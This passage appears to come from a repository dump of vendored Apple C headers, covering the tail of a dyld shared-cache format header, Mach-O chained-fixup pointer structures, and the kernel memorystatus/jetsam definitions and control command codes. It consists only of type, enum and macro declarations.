//        loc->raw = newValue;
//    } while (delta != 0);
//
//
struct dyld_cache_slide_info5
{
    uint32_t    version;            // currently 5
    uint32_t    page_size;          // currently 4096 (may also be 16384)
    uint32_t    page_starts_count;
    uint64_t    value_add;
    uint16_t    page_starts[/* page_starts_count */];
};

#define DYLD_CACHE_SLIDE_V5_PAGE_ATTR_NO_REBASE    0xFFFF    // page has no rebasing

union dyld_cache_slide_pointer5
{
    uint64_t  raw;
    struct dyld_chained_ptr_arm64e_shared_cache_rebase      regular;
    struct dyld_chained_ptr_arm64e_shared_cache_auth_rebase auth;
};


struct dyld_cache_local_symbols_info
{
    uint32_t    nlistOffset;        // offset into this chunk of nlist entries
    uint32_t    nlistCount;         // count of nlist entries
    uint32_t    stringsOffset;      // offset into this chunk of string pool
    uint32_t    stringsSize;        // byte count of string pool
    uint32_t    entriesOffset;      // offset into this chunk of array of dyld_cache_local_symbols_entry
    uint32_t    entriesCount;       // number of elements in dyld_cache_local_symbols_entry array
};

struct dyld_cache_local_symbols_entry
{
    uint32_t    dylibOffset;        // offset in cache file of start of dylib
    uint32_t    nlistStartIndex;    // start index of locals for this dylib
    uint32_t    nlistCount;         // number of local symbols for this dylib
};

struct dyld_cache_local_symbols_entry_64
{
    uint64_t    dylibOffset;        // offset in cache buffer of start of dylib
    uint32_t    nlistStartIndex;    // start index of locals for this dylib
    uint32_t    nlistCount;         // number of local symbols for this dylib
};

struct dyld_subcache_entry_v1
{
    uint8_t     uuid[16];           // The UUID of the subCache file
    uint64_t    cacheVMOffset;      // The offset of this subcache from the main cache base address
};

struct dyld_subcache_entry
{
    uint8_t     uuid[16];           // The UUID of the subCache file
    uint64_t    cacheVMOffset;      // The offset of this subcache from the main cache base address
    char        fileSuffix[32];     // The file name suffix of the subCache file e.g. ".25.data", ".03.development"
};

// This struct is a small piece of dynamic data that can be included in the shared region, and contains configuration
// data about the shared cache in use by the process. It is located
struct dyld_cache_dynamic_data_header
{
    char        magic[16];              // e.g. "dyld_data    v0"
    uint64_t    fsId;                   // The fsid_t of the shared cache being used by a process
    uint64_t    fsObjId;                // The fs_obj_id_t of the shared cache being used by a process
};

// This is the  location of the macOS shared cache on macOS 11.0 and later
#define MACOSX_MRM_DYLD_SHARED_CACHE_DIR   "/System/Library/dyld/"

// This is old define for the old location of the dyld cache
#define MACOSX_DYLD_SHARED_CACHE_DIR       MACOSX_MRM_DYLD_SHARED_CACHE_DIR

#define IPHONE_DYLD_SHARED_CACHE_DIR       "/System/Library/Caches/com.apple.dyld/"

#define DRIVERKIT_DYLD_SHARED_CACHE_DIR    "/System/DriverKit/System/Library/dyld/"

#define EXCLAVEKIT_DYLD_SHARED_CACHE_DIR   "/System/ExclaveKit/System/Library/dyld/"

#if !TARGET_OS_SIMULATOR
  #define DYLD_SHARED_CACHE_BASE_NAME        "dyld_shared_cache_"
#else
  #define DYLD_SHARED_CACHE_BASE_NAME        "dyld_sim_shared_cache_"
#endif
#define DYLD_SHARED_CACHE_DEVELOPMENT_EXT  ".development"

#define DYLD_SHARED_CACHE_DYNAMIC_DATA_MAGIC    "dyld_data    v0"

static const char* cryptexPrefixes[] = {
    "/System/Volumes/Preboot/Cryptexes/OS/",
    "/private/preboot/Cryptexes/OS/",
    "/System/Cryptexes/OS"
};

static const uint64_t kDyldSharedCacheTypeDevelopment = 0;
static const uint64_t kDyldSharedCacheTypeProduction = 1;
static const uint64_t kDyldSharedCacheTypeUniversal = 2;





#endif // __DYLD_CACHE_FORMAT__



```

`BaseBin/_external/include/fixup-chains.h`:

```h
/* -*- mode: C++; c-basic-offset: 4; tab-width: 4 -*-
 *
 * Copyright (c) 2018 Apple Inc. All rights reserved.
 *
 * @APPLE_LICENSE_HEADER_START@
 *
 * This file contains Original Code and/or Modifications of Original Code
 * as defined in and that are subject to the Apple Public Source License
 * Version 2.0 (the 'License'). You may not use this file except in
 * compliance with the License. Please obtain a copy of the License at
 * http://www.opensource.apple.com/apsl/ and read it before using this
 * file.
 *
 * The Original Code and all software distributed under the License are
 * distributed on an 'AS IS' basis, WITHOUT WARRANTY OF ANY KIND, EITHER
 * EXPRESS OR IMPLIED, AND APPLE HEREBY DISCLAIMS ALL SUCH WARRANTIES,
 * INCLUDING WITHOUT LIMITATION, ANY WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE, QUIET ENJOYMENT OR NON-INFRINGEMENT.
 * Please see the License for the specific language governing rights and
 * limitations under the License.
 *
 * @APPLE_LICENSE_HEADER_END@
 */

#ifndef __MACH_O_FIXUP_CHAINS__
#define __MACH_O_FIXUP_CHAINS__ 6


#include <stdint.h>


//#define LC_DYLD_EXPORTS_TRIE   0x80000033 // used with linkedit_data_command
//#define LC_DYLD_CHAINED_FIXUPS 0x80000034 // used with linkedit_data_command, payload is dyld_chained_fixups_header


// header of the LC_DYLD_CHAINED_FIXUPS payload
struct dyld_chained_fixups_header
{
    uint32_t    fixups_version;    // 0
    uint32_t    starts_offset;     // offset of dyld_chained_starts_in_image in chain_data
    uint32_t    imports_offset;    // offset of imports table in chain_data
    uint32_t    symbols_offset;    // offset of symbol strings in chain_data
    uint32_t    imports_count;     // number of imported symbol names
    uint32_t    imports_format;    // DYLD_CHAINED_IMPORT*
    uint32_t    symbols_format;    // 0 => uncompressed, 1 => zlib compressed
};

// This struct is embedded in LC_DYLD_CHAINED_FIXUPS payload
struct dyld_chained_starts_in_image
{
    uint32_t    seg_count;
    uint32_t    seg_info_offset[1];  // each entry is offset into this struct for that segment
    // followed by pool of dyld_chain_starts_in_segment data
};

// This struct is embedded in dyld_chain_starts_in_image
// and passed down to the kernel for page-in linking
struct dyld_chained_starts_in_segment
{
    uint32_t    size;               // size of this (amount kernel needs to copy)
    uint16_t    page_size;          // 0x1000 or 0x4000
    uint16_t    pointer_format;     // DYLD_CHAINED_PTR_*
    uint64_t    segment_offset;     // offset in memory to start of segment
    uint32_t    max_valid_pointer;  // for 32-bit OS, any value beyond this is not a pointer
    uint16_t    page_count;         // how many pages are in array
    uint16_t    page_start[1];      // each entry is offset in each page of first element in chain
                                    // or DYLD_CHAINED_PTR_START_NONE if no fixups on page
 // uint16_t    chain_starts[1];    // some 32-bit formats may require multiple starts per page.
                                    // for those, if high bit is set in page_starts[], then it
                                    // is index into chain_starts[] which is a list of starts
                                    // the last of which has the high bit set
};

enum {
    DYLD_CHAINED_PTR_START_NONE   = 0xFFFF, // used in page_start[] to denote a page with no fixups
    DYLD_CHAINED_PTR_START_MULTI  = 0x8000, // used in page_start[] to denote a page which has multiple starts
    DYLD_CHAINED_PTR_START_LAST   = 0x8000, // used in chain_starts[] to denote last start in list for page
};

// This struct is embedded in __TEXT,__chain_starts section in firmware
struct dyld_chained_starts_offsets
{
    uint32_t    pointer_format;     // DYLD_CHAINED_PTR_32_FIRMWARE
    uint32_t    starts_count;       // number of starts in array
    uint32_t    chain_starts[1];    // array chain start offsets
};


// values for dyld_chained_starts_in_segment.pointer_format
enum {
    DYLD_CHAINED_PTR_ARM64E                 =  1,    // stride 8, unauth target is vmaddr
    DYLD_CHAINED_PTR_64                     =  2,    // target is vmaddr
    DYLD_CHAINED_PTR_32                     =  3,
    DYLD_CHAINED_PTR_32_CACHE               =  4,
    DYLD_CHAINED_PTR_32_FIRMWARE            =  5,
    DYLD_CHAINED_PTR_64_OFFSET              =  6,    // target is vm offset
    DYLD_CHAINED_PTR_ARM64E_OFFSET          =  7,    // old name
    DYLD_CHAINED_PTR_ARM64E_KERNEL          =  7,    // stride 4, unauth target is vm offset
    DYLD_CHAINED_PTR_64_KERNEL_CACHE        =  8,
    DYLD_CHAINED_PTR_ARM64E_USERLAND        =  9,    // stride 8, unauth target is vm offset
    DYLD_CHAINED_PTR_ARM64E_FIRMWARE        = 10,    // stride 4, unauth target is vmaddr
    DYLD_CHAINED_PTR_X86_64_KERNEL_CACHE    = 11,    // stride 1, x86_64 kernel caches
    DYLD_CHAINED_PTR_ARM64E_USERLAND24      = 12,    // stride 8, unauth target is vm offset, 24-bit bind
    DYLD_CHAINED_PTR_ARM64E_SHARED_CACHE    = 13,    // stride 8, regular/auth targets both vm offsets.  Only A keys supported
};


// DYLD_CHAINED_PTR_ARM64E
struct dyld_chained_ptr_arm64e_rebase
{
    uint64_t    target   : 43,
                high8    :  8,
                next     : 11,    // 4 or 8-byte stide
                bind     :  1,    // == 0
                auth     :  1;    // == 0
};

// DYLD_CHAINED_PTR_ARM64E
struct dyld_chained_ptr_arm64e_bind
{
    uint64_t    ordinal   : 16,
                zero      : 16,
                addend    : 19,    // +/-256K
                next      : 11,    // 4 or 8-byte stide
                bind      :  1,    // == 1
                auth      :  1;    // == 0
};

// DYLD_CHAINED_PTR_ARM64E
struct dyld_chained_ptr_arm64e_auth_rebase
{
    uint64_t    target    : 32,   // runtimeOffset
                diversity : 16,
                addrDiv   :  1,
                key       :  2,
                next      : 11,    // 4 or 8-byte stide
                bind      :  1,    // == 0
                auth      :  1;    // == 1
};

// DYLD_CHAINED_PTR_ARM64E
struct dyld_chained_ptr_arm64e_auth_bind
{
    uint64_t    ordinal   : 16,
                zero      : 16,
                diversity : 16,
                addrDiv   :  1,
                key       :  2,
                next      : 11,    // 4 or 8-byte stide
                bind      :  1,    // == 1
                auth      :  1;    // == 1
};

// DYLD_CHAINED_PTR_64/DYLD_CHAINED_PTR_64_OFFSET
struct dyld_chained_ptr_64_rebase
{
    uint64_t    target    : 36,    // 64GB max image size (DYLD_CHAINED_PTR_64 => vmAddr, DYLD_CHAINED_PTR_64_OFFSET => runtimeOffset)
                high8     :  8,    // top 8 bits set to this (DYLD_CHAINED_PTR_64 => after slide added, DYLD_CHAINED_PTR_64_OFFSET => before slide added)
                reserved  :  7,    // all zeros
                next      : 12,    // 4-byte stride
                bind      :  1;    // == 0
};


// DYLD_CHAINED_PTR_ARM64E_USERLAND24
struct dyld_chained_ptr_arm64e_bind24
{
    uint64_t    ordinal   : 24,
                zero      :  8,
                addend    : 19,    // +/-256K
                next      : 11,    // 8-byte stide
                bind      :  1,    // == 1
                auth      :  1;    // == 0
};

// DYLD_CHAINED_PTR_ARM64E_USERLAND24
struct dyld_chained_ptr_arm64e_auth_bind24
{
    uint64_t    ordinal   : 24,
                zero      :  8,
                diversity : 16,
                addrDiv   :  1,
                key       :  2,
                next      : 11,    // 8-byte stide
                bind      :  1,    // == 1
                auth      :  1;    // == 1
};


// DYLD_CHAINED_PTR_64
struct dyld_chained_ptr_64_bind
{
    uint64_t    ordinal   : 24,
                addend    :  8,   // 0 thru 255
                reserved  : 19,   // all zeros
                next      : 12,   // 4-byte stride
                bind      :  1;   // == 1
};

// DYLD_CHAINED_PTR_64_KERNEL_CACHE, DYLD_CHAINED_PTR_X86_64_KERNEL_CACHE
struct dyld_chained_ptr_64_kernel_cache_rebase
{
    uint64_t    target     : 30,   // basePointers[cacheLevel] + target
                cacheLevel :  2,   // what level of cache to bind to (indexes a mach_header array)
                diversity  : 16,
                addrDiv    :  1,
                key        :  2,
                next       : 12,    // 1 or 4-byte stide
                isAuth     :  1;    // 0 -> not authenticated.  1 -> authenticated
};

// DYLD_CHAINED_PTR_32
// Note: for DYLD_CHAINED_PTR_32 some non-pointer values are co-opted into the chain
// as out of range rebases.  If an entry in the chain is > max_valid_pointer, then it
// is not a pointer.  To restore the value, subtract off the bias, which is
// (64MB+max_valid_pointer)/2.
struct dyld_chained_ptr_32_rebase
{
    uint32_t    target    : 26,   // vmaddr, 64MB max image size
                next      :  5,   // 4-byte stride
                bind      :  1;   // == 0
};

// DYLD_CHAINED_PTR_32
struct dyld_chained_ptr_32_bind
{
    uint32_t    ordinal   : 20,
                addend    :  6,   // 0 thru 63
                next      :  5,   // 4-byte stride
                bind      :  1;   // == 1
};

// DYLD_CHAINED_PTR_32_CACHE
struct dyld_chained_ptr_32_cache_rebase
{
    uint32_t    target    : 30,   // 1GB max dyld cache TEXT and DATA
                next      :  2;   // 4-byte stride
};


// DYLD_CHAINED_PTR_32_FIRMWARE
struct dyld_chained_ptr_32_firmware_rebase
{
    uint32_t    target   : 26,   // 64MB max firmware TEXT and DATA
                next     :  6;   // 4-byte stride
};

// DYLD_CHAINED_PTR_ARM64E_SHARED_CACHE
struct dyld_chained_ptr_arm64e_shared_cache_rebase
{
    uint64_t    runtimeOffset   : 34,   // offset from the start of the shared cache
                high8           :  8,
                unused          : 10,
                next            : 11,   // 8-byte stide
                auth            :  1;   // == 0
};

// DYLD_CHAINED_PTR_ARM64E_SHARED_CACHE
struct dyld_chained_ptr_arm64e_shared_cache_auth_rebase
{
    uint64_t    runtimeOffset   : 34,   // offset from the start of the shared cache
                diversity       : 16,
                addrDiv         :  1,
                keyIsData       :  1,   // implicitly always the 'A' key.  0 -> IA.  1 -> DA
                next            : 11,   // 8-byte stide
                auth            :  1;   // == 1
};



// values for dyld_chained_fixups_header.imports_format
enum {
    DYLD_CHAINED_IMPORT          = 1,
    DYLD_CHAINED_IMPORT_ADDEND   = 2,
    DYLD_CHAINED_IMPORT_ADDEND64 = 3,
};

// DYLD_CHAINED_IMPORT
struct dyld_chained_import
{
    uint32_t    lib_ordinal :  8,   // -15 .. 240 (0xF1 .. 0xF0)
                weak_import :  1,
                name_offset : 23;
};

// DYLD_CHAINED_IMPORT_ADDEND
struct dyld_chained_import_addend
{
    uint32_t    lib_ordinal :  8,   // -15 .. 240 (0xF1 .. 0xF0)
                weak_import :  1,
                name_offset : 23;
    int32_t     addend;
};

// DYLD_CHAINED_IMPORT_ADDEND64
struct dyld_chained_import_addend64
{
    uint64_t    lib_ordinal : 16,   // -15 .. 65520 (0xFFF1 .. 0xFFF0)
                weak_import :  1,
                reserved    : 15,
                name_offset : 32;
    uint64_t    addend;
};

#endif // __MACH_O_FIXUP_CHAINS__


```

`BaseBin/_external/include/kern_memorystatus.h`:

```h
/*
 * Copyright (c) 2006-2018 Apple Computer, Inc. All rights reserved.
 *
 * @APPLE_OSREFERENCE_LICENSE_HEADER_START@
 *
 * This file contains Original Code and/or Modifications of Original Code
 * as defined in and that are subject to the Apple Public Source License
 * Version 2.0 (the 'License'). You may not use this file except in
 * compliance with the License. The rights granted to you under the License
 * may not be used to create, or enable the creation or redistribution of,
 * unlawful or unlicensed copies of an Apple operating system, or to
 * circumvent, violate, or enable the circumvention or violation of, any
 * terms of an Apple operating system software license agreement.
 *
 * Please obtain a copy of the License at
 * http://www.opensource.apple.com/apsl/ and read it before using this file.
 *
 * The Original Code and all software distributed under the License are
 * distributed on an 'AS IS' basis, WITHOUT WARRANTY OF ANY KIND, EITHER
 * EXPRESS OR IMPLIED, AND APPLE HEREBY DISCLAIMS ALL SUCH WARRANTIES,
 * INCLUDING WITHOUT LIMITATION, ANY WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE, QUIET ENJOYMENT OR NON-INFRINGEMENT.
 * Please see the License for the specific language governing rights and
 * limitations under the License.
 *
 * @APPLE_OSREFERENCE_LICENSE_HEADER_END@
 */

#ifndef SYS_MEMORYSTATUS_H
#define SYS_MEMORYSTATUS_H

#include <sys/time.h>
#include <mach_debug/zone_info.h>
#include <sys/proc.h>

#define MEMORYSTATUS_ENTITLEMENT "com.apple.private.memorystatus"

#define JETSAM_PRIORITY_REVISION                  2

#define JETSAM_PRIORITY_IDLE_HEAD                -2
/* The value -1 is an alias to JETSAM_PRIORITY_DEFAULT */
#define JETSAM_PRIORITY_IDLE                      0
#define JETSAM_PRIORITY_IDLE_DEFERRED             1 /* Keeping this around till all xnu_quick_tests can be moved away from it.*/
#define JETSAM_PRIORITY_AGING_BAND1               JETSAM_PRIORITY_IDLE_DEFERRED
#define JETSAM_PRIORITY_BACKGROUND_OPPORTUNISTIC  2
#define JETSAM_PRIORITY_AGING_BAND2               JETSAM_PRIORITY_BACKGROUND_OPPORTUNISTIC
#define JETSAM_PRIORITY_BACKGROUND                3
#define JETSAM_PRIORITY_ELEVATED_INACTIVE         JETSAM_PRIORITY_BACKGROUND
#define JETSAM_PRIORITY_MAIL                      4
#define JETSAM_PRIORITY_PHONE                     5
#define JETSAM_PRIORITY_UI_SUPPORT                8
#define JETSAM_PRIORITY_FOREGROUND_SUPPORT        9
#define JETSAM_PRIORITY_FOREGROUND               10
#define JETSAM_PRIORITY_AUDIO_AND_ACCESSORY      12
#define JETSAM_PRIORITY_CONDUCTOR                13
#define JETSAM_PRIORITY_DRIVER_APPLE             15
#define JETSAM_PRIORITY_HOME                     16
#define JETSAM_PRIORITY_EXECUTIVE                17
#define JETSAM_PRIORITY_IMPORTANT                18
#define JETSAM_PRIORITY_CRITICAL                 19

#define JETSAM_PRIORITY_MAX                      21

/* TODO - tune. This should probably be lower priority */
#define JETSAM_PRIORITY_DEFAULT                  18
#define JETSAM_PRIORITY_TELEPHONY                19

/* Compatibility */
#define DEFAULT_JETSAM_PRIORITY                  18

/*
 * The deferral time used by default for apps and daemons in all aging
 * policies except kJetsamAgingPolicySysProcsReclaimedFirst is
 * DEFERRED_IDLE_EXIT_TIME_SECS.
 *
 * For kJetsamAgingPolicySysProcsReclaimedFirst,
 *
 * Daemons: The actual idle deferred time for the daemon is based on
 * the relaunch behavior of the daemon. The relaunch behavior determines
 * the scaling factor applied to DEFERRED_IDLE_EXIT_TIME_SECS. See
 * kJetsamSysProcsIdleDelayTime* ratios defined in kern_memorystatus.c
 *
 * Apps: The apps are aged for DEFERRED_IDLE_EXIT_TIME_SECS factored
 * by kJetsamAppsIdleDelayTimeRatio.
 */
#define DEFERRED_IDLE_EXIT_TIME_SECS             10

#define KEV_MEMORYSTATUS_SUBCLASS                 3

enum {
	kMemorystatusLevelNote = 1,
	kMemorystatusSnapshotNote = 2,
	kMemorystatusFreezeNote = 3,
	kMemorystatusPressureNote = 4
};

enum {
	kMemorystatusLevelAny = -1,
	kMemorystatusLevelNormal = 0,
	kMemorystatusLevelWarning = 1,
	kMemorystatusLevelUrgent = 2,
	kMemorystatusLevelCritical = 3
};

#define KEV_DIRTYSTATUS_SUBCLASS                  4

enum {
	kDirtyStatusChangeNote = 1
};

typedef struct memorystatus_priority_entry {
	pid_t pid;
	int32_t priority;
	uint64_t user_data;
	int32_t limit;  /* MB */
	uint32_t state;
} memorystatus_priority_entry_t;

/*
 * This should be the structure to specify different properties
 * for processes (group or single) from user-space. Unfortunately,
 * we can't move to it completely because the priority_entry structure
 * above has been in use for a while now. We'll have to deprecate it.
 *
 * To support new fields/properties, we will add a new structure with a
 * new version and a new size.
 */
#define MEMORYSTATUS_MPE_VERSION_1              1

#define MEMORYSTATUS_MPE_VERSION_1_SIZE         sizeof(struct memorystatus_properties_entry_v1)

typedef struct memorystatus_properties_entry_v1 {
	int version;
	pid_t pid;
	int32_t priority;
	int use_probability;
	uint64_t user_data;
	int32_t limit;  /* MB */
	uint32_t state;
	char proc_name[MAXCOMLEN + 1];
	char __pad1[3];
} memorystatus_properties_entry_v1_t;

typedef struct memorystatus_kernel_stats {
	uint32_t free_pages;
	uint32_t active_pages;
	uint32_t inactive_pages;
	uint32_t throttled_pages;
	uint32_t purgeable_pages;
	uint32_t wired_pages;
	uint32_t speculative_pages;
	uint32_t filebacked_pages;
	uint32_t anonymous_pages;
	uint32_t compressor_pages;
	uint64_t compressions;
	uint64_t decompressions;
	uint64_t total_uncompressed_pages_in_compressor;
	uint64_t zone_map_size;
	uint64_t zone_map_capacity;
	uint64_t largest_zone_size;
	char     largest_zone_name[MACH_ZONE_NAME_MAX_LEN];
} memorystatus_kernel_stats_t;

typedef enum memorystatus_freeze_skip_reason {
	kMemorystatusFreezeSkipReasonNone = 0,
	kMemorystatusFreezeSkipReasonExcessSharedMemory = 1,
	kMemorystatusFreezeSkipReasonLowPrivateSharedRatio = 2,
	kMemorystatusFreezeSkipReasonNoCompressorSpace = 3,
	kMemorystatusFreezeSkipReasonNoSwapSpace = 4,
	kMemorystatusFreezeSkipReasonBelowMinPages = 5,
	kMemorystatusFreezeSkipReasonLowProbOfUse = 6,
	kMemorystatusFreezeSkipReasonOther = 7,
	kMemorystatusFreezeSkipReasonOutOfBudget = 8,
	kMemorystatusFreezeSkipReasonOutOfSlots = 9,
	kMemorystatusFreezeSkipReasonDisabled = 10,
	_kMemorystatusFreezeSkipReasonMax
} memorystatus_freeze_skip_reason_t;
/*
** This is a variable-length struct.
** Allocate a buffer of the size returned by the sysctl, cast to a memorystatus_snapshot_t *
*/

typedef struct jetsam_snapshot_entry {
	pid_t    pid;
	char     name[(2 * MAXCOMLEN) + 1];
	int32_t  priority;
	uint32_t state;
	uint32_t fds;
	memorystatus_freeze_skip_reason_t jse_freeze_skip_reason; /* why wasn't this process frozen? */
	uint8_t  uuid[16];
	uint64_t user_data;
	uint64_t killed;
	uint64_t pages;
	uint64_t max_pages_lifetime;
	uint64_t purgeable_pages;
	uint64_t jse_internal_pages;
	uint64_t jse_internal_compressed_pages;
	uint64_t jse_purgeable_nonvolatile_pages;
	uint64_t jse_purgeable_nonvolatile_compressed_pages;
	uint64_t jse_alternate_accounting_pages;
	uint64_t jse_alternate_accounting_compressed_pages;
	uint64_t jse_iokit_mapped_pages;
	uint64_t jse_page_table_pages;
	uint64_t jse_memory_region_count;
	uint64_t jse_gencount;                  /* memorystatus_thread generation counter */
	uint64_t jse_starttime;                 /* absolute time when process starts */
	uint64_t jse_killtime;                  /* absolute time when jetsam chooses to kill a process */
	uint64_t jse_idle_delta;                /* time spent in idle band */
	uint64_t jse_coalition_jetsam_id;       /* we only expose coalition id for COALITION_TYPE_JETSAM */
	struct timeval64 cpu_time;
	uint64_t jse_thaw_count;
	uint64_t jse_frozen_to_swap_pages;
} memorystatus_jetsam_snapshot_entry_t;

typedef struct jetsam_snapshot {
	uint64_t snapshot_time;                 /* absolute time snapshot was initialized */
	uint64_t notification_time;             /* absolute time snapshot was consumed */
	uint64_t js_gencount;                   /* memorystatus_thread generation counter */
	memorystatus_kernel_stats_t stats;      /* system stat when snapshot is initialized */
	size_t entry_count;
	memorystatus_jetsam_snapshot_entry_t entries[];
} memorystatus_jetsam_snapshot_t;

typedef enum dirty_status_change_event_type {
	kDirtyStatusChangedDirty = 0x0,
	kDirtyStatusChangedClean = 0x1
} dirty_status_change_event_type_t;

typedef struct dirty_status_change_event {
	pid_t    dsc_pid;
	char     dsc_process_name[(2 * MAXCOMLEN) + 1];
	dirty_status_change_event_type_t dsc_event_type;
	uint64_t dsc_time;
	uint64_t dsc_pages;
	int32_t dsc_priority;
} dirty_status_change_event_t;

/* TODO - deprecate; see <rdar://problem/12969599> */
#define kMaxSnapshotEntries 192

/*
 * default jetsam snapshot support
 */
extern memorystatus_jetsam_snapshot_t *memorystatus_jetsam_snapshot;
extern memorystatus_jetsam_snapshot_t *memorystatus_jetsam_snapshot_copy;
#if CONFIG_FREEZE
extern memorystatus_jetsam_snapshot_t *memorystatus_jetsam_snapshot_freezer;
extern unsigned int memorystatus_jetsam_snapshot_freezer_max;
extern unsigned int memorystatus_jetsam_snapshot_freezer_size;
#endif /* CONFIG_FREEZE */
extern unsigned int memorystatus_jetsam_snapshot_count;
extern unsigned int memorystatus_jetsam_snapshot_copy_count;
extern unsigned int memorystatus_jetsam_snapshot_max;
extern unsigned int memorystatus_jetsam_snapshot_size;
extern uint64_t memorystatus_jetsam_snapshot_last_timestamp;
extern uint64_t memorystatus_jetsam_snapshot_timeout;
#define memorystatus_jetsam_snapshot_list memorystatus_jetsam_snapshot->entries
#define JETSAM_SNAPSHOT_TIMEOUT_SECS 30

/* General memorystatus stuff */

extern uint64_t memorystatus_sysprocs_idle_delay_time;
extern uint64_t memorystatus_apps_idle_delay_time;

/* State */
#define kMemorystatusSuspended        0x01
#define kMemorystatusFrozen           0x02
#define kMemorystatusWasThawed        0x04
#define kMemorystatusTracked          0x08
#define kMemorystatusSupportsIdleExit 0x10
#define kMemorystatusDirty            0x20
#define kMemorystatusAssertion        0x40

/*
 * Jetsam exit reason definitions - related to memorystatus
 *
 * When adding new exit reasons also update:
 *	JETSAM_REASON_MEMORYSTATUS_MAX
 *	kMemorystatusKilled... Cause enum
 *	memorystatus_kill_cause_name[]
 */
#define JETSAM_REASON_INVALID                                                           0
#define JETSAM_REASON_GENERIC                                                           1
#define JETSAM_REASON_MEMORY_HIGHWATER                                          2
#define JETSAM_REASON_VNODE                                                                     3
#define JETSAM_REASON_MEMORY_VMPAGESHORTAGE                                     4
#define JETSAM_REASON_MEMORY_PROCTHRASHING                                      5
#define JETSAM_REASON_MEMORY_FCTHRASHING                                        6
#define JETSAM_REASON_MEMORY_PERPROCESSLIMIT                            7
#define JETSAM_REASON_MEMORY_DISK_SPACE_SHORTAGE                        8
#define JETSAM_REASON_MEMORY_IDLE_EXIT                                          9
#define JETSAM_REASON_ZONE_MAP_EXHAUSTION                                       10
#define JETSAM_REASON_MEMORY_VMCOMPRESSOR_THRASHING                     11
#define JETSAM_REASON_MEMORY_VMCOMPRESSOR_SPACE_SHORTAGE        12
#define JETSAM_REASON_LOWSWAP                                   13
#define JETSAM_REASON_MEMORYSTATUS_MAX  JETSAM_REASON_LOWSWAP

/*
 * Jetsam exit reason definitions - not related to memorystatus
 */
#define JETSAM_REASON_CPULIMIT                  100

/* Cause */
enum {
	kMemorystatusInvalid                                                    = JETSAM_REASON_INVALID,
	kMemorystatusKilled                                                             = JETSAM_REASON_GENERIC,
	kMemorystatusKilledHiwat                                                = JETSAM_REASON_MEMORY_HIGHWATER,
	kMemorystatusKilledVnodes                                               = JETSAM_REASON_VNODE,
	kMemorystatusKilledVMPageShortage                               = JETSAM_REASON_MEMORY_VMPAGESHORTAGE,
	kMemorystatusKilledProcThrashing                                = JETSAM_REASON_MEMORY_PROCTHRASHING,
	kMemorystatusKilledFCThrashing                                  = JETSAM_REASON_MEMORY_FCTHRASHING,
	kMemorystatusKilledPerProcessLimit                              = JETSAM_REASON_MEMORY_PERPROCESSLIMIT,
	kMemorystatusKilledDiskSpaceShortage                    = JETSAM_REASON_MEMORY_DISK_SPACE_SHORTAGE,
	kMemorystatusKilledIdleExit                                             = JETSAM_REASON_MEMORY_IDLE_EXIT,
	kMemorystatusKilledZoneMapExhaustion                    = JETSAM_REASON_ZONE_MAP_EXHAUSTION,
	kMemorystatusKilledVMCompressorThrashing                = JETSAM_REASON_MEMORY_VMCOMPRESSOR_THRASHING,
	kMemorystatusKilledVMCompressorSpaceShortage    = JETSAM_REASON_MEMORY_VMCOMPRESSOR_SPACE_SHORTAGE,
	kMemorystatusKilledLowSwap                      = JETSAM_REASON_LOWSWAP,
};

/*
 * For backwards compatibility
 * Keeping these around for external users (e.g. ReportCrash, Ariadne).
 * TODO: Remove once they stop using these.
 */
#define kMemorystatusKilledDiagnostic           kMemorystatusKilledDiskSpaceShortage
#define kMemorystatusKilledVMThrashing          kMemorystatusKilledVMCompressorThrashing
#define JETSAM_REASON_MEMORY_VMTHRASHING        JETSAM_REASON_MEMORY_VMCOMPRESSOR_THRASHING

/* Memorystatus control */
#define MEMORYSTATUS_BUFFERSIZE_MAX 65536

#ifndef KERNEL
int memorystatus_get_level(user_addr_t level);
int memorystatus_control(uint32_t command, int32_t pid, uint32_t flags, void *buffer, size_t buffersize);
#endif

/* Commands */
#define MEMORYSTATUS_CMD_GET_PRIORITY_LIST            1
#define MEMORYSTATUS_CMD_SET_PRIORITY_PROPERTIES      2
#define MEMORYSTATUS_CMD_GET_JETSAM_SNAPSHOT          3
#define MEMORYSTATUS_CMD_GET_PRESSURE_STATUS          4
#define MEMORYSTATUS_CMD_SET_JETSAM_HIGH_WATER_MARK   5    /* Set active memory limit = inactive memory limit, both non-fatal	*/
#define MEMORYSTATUS_CMD_SET_JETSAM_TASK_LIMIT        6    /* Set active memory limit = inactive memory limit, both fatal	*/
#define MEMORYSTATUS_CMD_SET_MEMLIMIT_PROPERTIES      7    /* Set memory limits plus attributes independently			*/
#define MEMORYSTATUS_CMD_GET_MEMLIMIT_PROPERTIES      8    /* Get memory limits plus attributes					*/
#define MEMORYSTATUS_CMD_PRIVILEGED_LISTENER_ENABLE   9    /* Set the task's status as a privileged listener w.r.t memory notifications  */
#define MEMORYSTATUS_CMD_PRIVILEGED_LISTENER_DISABLE  10   /* Reset the task's status as a privileged listener w.r.t memory notifications  */
#define MEMORYSTATUS_CMD_AGGRESSIVE_JETSAM_LENIENT_MODE_ENABLE  11   /* Enable the 'lenient' mode for aggressive jetsam. See comments in kern_memorystatus.c near the top. */
#define MEMORYSTATUS_CMD_AGGRESSIVE_JETSAM_LENIENT_MODE_DISABLE 12   /* Disable the 'lenient' mode for aggressive jetsam. */
#define MEMORYSTATUS_CMD_GET_MEMLIMIT_EXCESS          13   /* Compute how much a process's phys_footprint exceeds inactive memory limit */
#define MEMORYSTATUS_CMD_ELEVATED_INACTIVEJETSAMPRIORITY_ENABLE         14 /* Set the inactive jetsam band for a process to JETSAM_PRIORITY_ELEVATED_INACTIVE */
#define MEMORYSTATUS_CMD_ELEVATED_INACTIVEJETSAMPRIORITY_DISABLE        15 /* Reset the inactive jetsam band for a process to the default band (0)*/
#define MEMORYSTATUS_CMD_SET_PROCESS_IS_MANAGED       16   /* (Re-)Set state on a process that marks it as (un-)managed by a system entity e.g. assertiond */
#define MEMORYSTATUS_CMD_GET_PROCESS_IS_MANAGED       17   /* Return the 'managed' status of a process */
#define MEMORYSTATUS_CMD_SET_PROCESS_IS_FREEZABLE     18   /* Is the process eligible for freezing? Apps and extensions can pass in FALSE to opt out of freezing, i.e.,
	                                                    *  if they would prefer being jetsam'ed in the idle band to being frozen in an elevated band. */
#define MEMORYSTATUS_CMD_GET_PROCESS_IS_FREEZABLE     19   /* Return the freezable state of a process. */

#define MEMORYSTATUS_CMD_FREEZER_CONTROL              20

